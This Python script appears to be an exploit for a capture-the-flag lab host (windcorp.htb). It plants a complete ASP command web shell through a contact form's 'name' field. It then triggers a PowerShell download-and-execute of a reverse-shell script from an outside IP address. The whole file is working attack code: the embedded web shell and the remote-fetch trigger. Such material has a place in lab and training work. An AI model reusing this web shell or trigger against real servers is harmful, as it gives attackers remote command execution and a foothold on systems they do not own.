#!/usr/bin/env python3
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}

url = "https://www.windcorp.htb"

# asp cmd shell
cmdshell = """
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
If (szCMD <> "") Then
  szTempFile = "C:\" & oFileSys.GetTempName( )
  Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
  Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
  End If
%>

<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>
<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<br>
<%
  If (IsObject(oFile)) Then
    On Error Resume Next
    Response.Write Server.HTMLEncode(oFile.ReadAll)
    oFile.Close
    Call oFileSys.DeleteFile(szTempFile, True)
  End If
%>
</BODY>
</HTML>

"""

payload = {
"name": cmdshell,
"email": "test@test.de",
"subject": "test",
"message": "test",
}

requests.get(f"{url}/save.asp", params=payload, proxies=proxies, verify=False)

trigger = {
    "cmd": "powershell -c \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/rev.ps1')\""
}

requests.get(f"{url}/preview.asp", params=trigger, proxies=proxies, verify=False)
